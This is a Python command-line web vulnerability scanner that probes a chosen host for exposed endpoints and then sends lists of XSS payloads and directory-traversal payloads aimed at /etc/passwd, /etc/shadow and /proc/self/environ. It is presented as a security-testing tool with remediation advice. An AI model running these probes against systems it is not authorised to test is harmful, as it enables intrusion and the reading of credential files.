#!/usr/bin/env python3
"""
Web Vulnerability Fuzzer for security testing
Tests for XSS, directory traversal, and other common web vulnerabilities
"""
import requests
import sys
import argparse
import time
import urllib.parse
import json
from datetime import datetime
import logging
import os

class WebFuzzer:
    def __init__(self, target, port=8080, log_file=None):
        self.target = target
        self.port = port
        self.base_url = f"http://{target}:{port}"
        self.session = requests.Session()
        self.results = {
            'xss_tests': [],
            'traversal_tests': [],
            'endpoint_tests': [],
            'vulnerability_summary': {}
        }
        self.setup_logging(log_file)
    
    def setup_logging(self, log_file):
        """Setup logging for the fuzzer"""
        if log_file is None:
            log_dir = os.path.expanduser("~/logs")
            try:
                os.makedirs(log_dir, exist_ok=True)
                log_file = os.path.join(log_dir, f"web_fuzzer_{int(time.time())}.log")
            except:
                log_file = f"/tmp/web_fuzzer_{int(time.time())}.log"
        
        self.log_file = log_file
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(log_file),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
        self.logger.info(f"Web fuzzer initialized for {self.base_url}")
    
    def test_endpoint(self, endpoint, method='GET', params=None, timeout=5):
        """Test a single endpoint and analyze response"""
        url = f"{self.base_url}{endpoint}"
        
        try:
            if method.upper() == 'GET':
                response = self.session.get(url, params=params, timeout=timeout)
            elif method.upper() == 'POST':
                response = self.session.post(url, data=params, timeout=timeout)
            else:
                return None
            
            result = {
                'timestamp': datetime.now().isoformat(),
                'url': url,
                'method': method,
                'status_code': response.status_code,
                'response_time': response.elapsed.total_seconds(),
                'content_length': len(response.content),
                'headers': dict(response.headers),
                'content_type': response.headers.get('content-type', ''),
                'response_text': response.text[:1000] if response.text else ''
            }
            
            # Analyze response for interesting content
            result['analysis'] = self.analyze_response(response)
            
            return result
            
        except requests.exceptions.RequestException as e:
            return {
                'timestamp': datetime.now().isoformat(),
                'url': url,
                'method': method,
                'error': str(e),
                'status': 'failed'
            }
    
    def analyze_response(self, response):
        """Analyze HTTP response for security issues"""
        analysis = {
            'potential_vulnerabilities': [],
            'interesting_headers': [],
            'error_indicators': [],
            'information_disclosure': []
        }
        
        content = response.text.lower() if response.text else ''
        
        # Check for error indicators
        error_indicators = ['error', 'exception', 'traceback', 'warning', 'debug']
        for indicator in error_indicators:
            if indicator in content:
                analysis['error_indicators'].append(indicator)
        
        # Check for information disclosure
        info_patterns = ['version', 'server', 'path', 'directory', 'root', 'admin', 'config']
        for pattern in info_patterns:
            if pattern in content:
                analysis['information_disclosure'].append(pattern)
        
        # Check headers for security issues
        headers = {k.lower(): v for k, v in response.headers.items()}
        
        if 'server' in headers:
            analysis['interesting_headers'].append(f"server: {headers['server']}")
        
        # Check for missing security headers
        security_headers = ['x-frame-options', 'x-xss-protection', 'x-content-type-options', 'strict-transport-security']
        for header in security_headers:
            if header not in headers:
                analysis['potential_vulnerabilities'].append(f"missing_{header.replace('-', '_')}")
        
        return analysis
    
    def test_xss_vulnerabilities(self, endpoints=None):
        """Test for Cross-Site Scripting vulnerabilities"""
        if endpoints is None:
            endpoints = ['/echo', '/search', '/comment', '/feedback']
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>"
        ]
        
        print(f"Testing for XSS vulnerabilities...")
        print(f"Testing {len(endpoints)} endpoints with {len(xss_payloads)} payloads")
        print("-" * 60)
        
        vulnerable_endpoints = []
        
        for endpoint in endpoints:
            print(f"Testing endpoint: {endpoint}")
            
            for i, payload in enumerate(xss_payloads):
                # Test different parameter names
                param_names = ['msg', 'q', 'search', 'comment', 'data', 'input', 'text']
                
                for param_name in param_names:
                    params = {param_name: payload}
                    result = self.test_endpoint(endpoint, params=params)
                    
                    if result and result.get('status_code') == 200:
                        response_text = result.get('response_text', '').lower()
                        
                        # Check if payload is reflected in response
                        if payload.lower() in response_text or any(tag in response_text for tag in ['<script>', '<img', '<svg', '<iframe']):
                            vulnerability = {
                                'endpoint': endpoint,
                                'parameter': param_name,
                                'payload': payload,
                                'url': result['url'],
                                'confirmed': True,
                                'response_preview': result['response_text'][:200]
                            }
                            vulnerable_endpoints.append(vulnerability)
                            self.results['xss_tests'].append(vulnerability)
                            
                            print(f"  🚨 XSS VULNERABILITY FOUND!")
                            print(f"     Endpoint: {endpoint}")
                            print(f"     Parameter: {param_name}")
                            print(f"     Payload: {payload[:50]}...")
                            
                            self.logger.warning(f"XSS vulnerability found: {endpoint}?{param_name}={payload[:30]}")
                            break
                    
                    time.sleep(0.1)  # Rate limiting
        
        print(f"\nXSS Test Results: {len(vulnerable_endpoints)} vulnerabilities found")
        return vulnerable_endpoints
    
    def test_directory_traversal(self, endpoints=None):
        """Test for directory traversal vulnerabilities"""
        if endpoints is None:
            endpoints = ['/file', '/download', '/view', '/read', '/include']
        
        traversal_payloads = [
            "../etc/passwd",
            "../../etc/passwd",
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/proc/version",
            "/proc/self/environ",
            "C:\\windows\\system32\\drivers\\etc\\hosts",
            "test.txt",  # Legitimate file for comparison
        ]
        
        print(f"Testing for Directory Traversal vulnerabilities...")
        print(f"Testing {len(endpoints)} endpoints with {len(traversal_payloads)} payloads")
        print("-" * 60)
        
        vulnerable_endpoints = []
        
        for endpoint in endpoints:
            print(f"Testing endpoint: {endpoint}")
            
            for payload in traversal_payloads:
                # Test different parameter names
                param_names = ['file', 'filename', 'name', 'path', 'document', 'page']
                
                for param_name in param_names:
                    params = {param_name: payload}
                    result = self.test_endpoint(endpoint, params=params)
                    
                    if result and result.get('status_code') == 200:
                        response_text = result.get('response_text', '')
                        
                        # Check for common file contents that indicate successful traversal
                        indicators = [
                            'root:x:', 'daemon:', '/bin/bash',  # /etc/passwd
                            '127.0.0.1', 'localhost',          # /etc/hosts
                            'Linux version', 'GNU/Linux'       # /proc/version
                        ]
                        
                        if any(indicator in response_text for indicator in indicators):
                            vulnerability = {
                                'endpoint': endpoint,
                                'parameter': param_name,
                                'payload': payload,
                                'url': result['url'],
                                'confirmed': True,
                                'response_preview': response_text[:300]
                            }
                            vulnerable_endpoints.append(vulnerability)
                            self.results['traversal_tests'].append(vulnerability)
                            
                            print(f"  🚨 DIRECTORY TRAVERSAL VULNERABILITY FOUND!")
                            print(f"     Endpoint: {endpoint}")
                            print(f"     Parameter: {param_name}")
                            print(f"     File accessed: {payload}")
                            print(f"     Content preview: {response_text[:100]}...")
                            
                            self.logger.warning(f"Directory traversal found: {endpoint}?{param_name}={payload}")
                            break
                    
                    time.sleep(0.1)  # Rate limiting
        
        print(f"\nDirectory Traversal Test Results: {len(vulnerable_endpoints)} vulnerabilities found")
        return vulnerable_endpoints
    
    def test_common_endpoints(self):
        """Test common web application endpoints"""
        endpoints = [
            '/',
            '/index.html',
            '/info',
            '/admin',
            '/config',
            '/status',
            '/debug',
            '/test',
            '/logs',
            '/backup',
            '/api',
            '/api/v1',
            '/robots.txt',
            '/sitemap.xml',
            '/.htaccess',
            '/web.config',
            '/crossdomain.xml',
            '/phpinfo.php',
            '/server-status',
            '/server-info'
        ]
        
        print(f"Testing common endpoints...")
        print(f"Scanning {len(endpoints)} endpoints")
        print("-" * 60)
        
        found_endpoints = []
        interesting_endpoints = []
        
        for endpoint in endpoints:
            result = self.test_endpoint(endpoint)
            
            if result and 'error' not in result:
                status = result.get('status_code')
                size = result.get('content_length', 0)
                
                if status == 200:
                    found_endpoints.append(endpoint)
                    print(f"✓ {endpoint:<20} [200] ({size} bytes)")
                    
                    # Check for interesting content
                    if result.get('analysis', {}).get('information_disclosure'):
                        interesting_endpoints.append({
                            'endpoint': endpoint,
                            'reason': 'information_disclosure',
                            'details': result['analysis']['information_disclosure']
                        })
                        print(f"  ⚠️  Information disclosure detected")
                elif status in [301, 302, 307, 308]:
                    print(f"↳ {endpoint:<20} [{status}] (redirect)")
                elif status == 403:
                    found_endpoints.append(endpoint)
                    print(f"🔒 {endpoint:<20} [403] (forbidden - exists but restricted)")
                elif status not in [404, 405]:
                    print(f"? {endpoint:<20} [{status}]")
            
            self.results['endpoint_tests'].append(result)
            time.sleep(0.1)  # Rate limiting
        
        print(f"\nEndpoint Discovery Results:")
        print(f"  Found endpoints: {len(found_endpoints)}")
        print(f"  Interesting endpoints: {len(interesting_endpoints)}")
        
        return found_endpoints, interesting_endpoints
    
    def run_comprehensive_scan(self):
        """Run all vulnerability tests"""
        print(f"🔍 Starting comprehensive web vulnerability scan")
        print(f"Target: {self.base_url}")
        print(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("=" * 80)
        
        # 1. Endpoint Discovery
        print(f"\n1️⃣  ENDPOINT DISCOVERY")
        print("=" * 40)
        found_endpoints, interesting = self.test_common_endpoints()
        
        # 2. XSS Testing
        print(f"\n2️⃣  CROSS-SITE SCRIPTING (XSS) TESTS")
        print("=" * 40)
        xss_vulns = self.test_xss_vulnerabilities()
        
        # 3. Directory Traversal Testing
        print(f"\n3️⃣  DIRECTORY TRAVERSAL TESTS")
        print("=" * 40)
        traversal_vulns = self.test_directory_traversal()
        
        # 4. Generate Summary
        self.generate_vulnerability_summary(found_endpoints, xss_vulns, traversal_vulns, interesting)
        
        return self.results
    
    def generate_vulnerability_summary(self, endpoints, xss_vulns, traversal_vulns, interesting):
        """Generate comprehensive vulnerability summary"""
        self.results['vulnerability_summary'] = {
            'scan_time': datetime.now().isoformat(),
            'target': self.base_url,
            'endpoints_found': len(endpoints),
            'xss_vulnerabilities': len(xss_vulns),
            'traversal_vulnerabilities': len(traversal_vulns),
            'information_disclosure': len(interesting),
            'total_vulnerabilities': len(xss_vulns) + len(traversal_vulns) + len(interesting)
        }
        
        print(f"\n" + "=" * 80)
        print("🎯 VULNERABILITY ASSESSMENT SUMMARY")
        print("=" * 80)
        
        print(f"Target: {self.base_url}")
        print(f"Scan completed: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        
        print(f"\n📊 FINDINGS:")
        print(f"├── Endpoints discovered: {len(endpoints)}")
        print(f"├── XSS vulnerabilities: {len(xss_vulns)} 🚨" if xss_vulns else f"├── XSS vulnerabilities: 0 ✅")
        print(f"├── Directory traversal: {len(traversal_vulns)} 🚨" if traversal_vulns else f"├── Directory traversal: 0 ✅")
        print(f"└── Information disclosure: {len(interesting)} ⚠️" if interesting else f"└── Information disclosure: 0 ✅")
        
        # Risk Assessment
        total_critical = len(xss_vulns) + len(traversal_vulns)
        
        if total_critical >= 5:
            risk_level = "🔴 CRITICAL"
        elif total_critical >= 2:
            risk_level = "🟠 HIGH"
        elif total_critical >= 1:
            risk_level = "🟡 MEDIUM"
        elif len(interesting) > 0:
            risk_level = "🔵 LOW"
        else:
            risk_level = "🟢 MINIMAL"
        
        print(f"\n🎚️  OVERALL RISK LEVEL: {risk_level}")
        
        # Recommendations
        print(f"\n💡 RECOMMENDATIONS:")
        if xss_vulns:
            print("   • Implement input validation and output encoding to prevent XSS")
        if traversal_vulns:
            print("   • Validate and sanitize file paths to prevent directory traversal")
        if interesting:
            print("   • Review information disclosure in endpoints")
        if not (xss_vulns or traversal_vulns or interesting):
            print("   • Continue regular security testing")
            print("   • Consider additional vulnerability scanners")
        
        print(f"\n📝 Detailed log saved to: {self.log_file}")
    
    def export_results(self, filename):
        """Export results to JSON file"""
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2)
        print(f"\n📄 Results exported to: {filename}")

def main():
    parser = argparse.ArgumentParser(description='Web Vulnerability Fuzzer for Security Testing')
    parser.add_argument('target', help='Target IP address or hostname')
    parser.add_argument('-p', '--port', type=int, default=8080, help='Target port')
    parser.add_argument('-t', '--test', choices=['xss', 'traversal', 'endpoints', 'all'], 
                       default='all', help='Type of test to run')
    parser.add_argument('-o', '--output', help='Export results to JSON file')
    parser.add_argument('--timeout', type=int, default=5, help='Request timeout')
    parser.add_argument('--delay', type=float, default=0.1, help='Delay between requests')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    # Initialize fuzzer
    fuzzer = WebFuzzer(args.target, args.port)
    
    try:
        if args.test == 'xss':
            fuzzer.test_xss_vulnerabilities()
        elif args.test == 'traversal':
            fuzzer.test_directory_traversal()
        elif args.test == 'endpoints':
            fuzzer.test_common_endpoints()
        else:  # all
            fuzzer.run_comprehensive_scan()
        
        # Export results if requested
        if args.output:
            fuzzer.export_results(args.output)
    
    except KeyboardInterrupt:
        print(f"\nScan interrupted by user")
        if fuzzer.results['xss_tests'] or fuzzer.results['traversal_tests']:
            fuzzer.generate_vulnerability_summary([], fuzzer.results['xss_tests'], 
                                                fuzzer.results['traversal_tests'], [])
    except Exception as e:
        fuzzer.logger.error(f"Scan failed: {e}")
        print(f"Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()